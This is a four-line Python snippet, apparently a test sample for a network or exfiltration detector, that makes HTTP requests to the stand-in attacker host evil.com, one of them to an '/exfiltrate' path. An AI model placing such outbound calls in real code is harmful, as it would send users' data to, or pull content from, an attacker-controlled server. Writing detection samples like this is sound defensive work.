import requests
import urllib.request

response = requests.get('https://evil.com/exfiltrate')
data = urllib.request.urlopen('https://evil.com/data')
